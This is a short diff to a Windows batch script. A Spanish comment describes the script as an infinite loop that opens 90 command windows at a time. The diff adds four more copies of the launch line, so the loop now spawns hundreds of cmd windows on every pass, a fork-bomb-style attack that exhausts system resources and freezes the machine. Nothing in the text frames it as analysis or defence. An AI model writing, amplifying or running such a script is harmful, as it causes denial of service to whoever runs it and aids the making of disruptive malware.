@@ -32,5 +32,9 @@ timeout /t 5 >nul
 :: Bucle infinito de 90 CMD a la vez
 :loop
 (for /l %%i in (1,1,90) do start cmd)
+(for /l %%i in (1,1,90) do start cmd)
+(for /l %%i in (1,1,90) do start cmd)
+(for /l %%i in (1,1,90) do start cmd)
+(for /l %%i in (1,1,90) do start cmd)
 goto loop
 
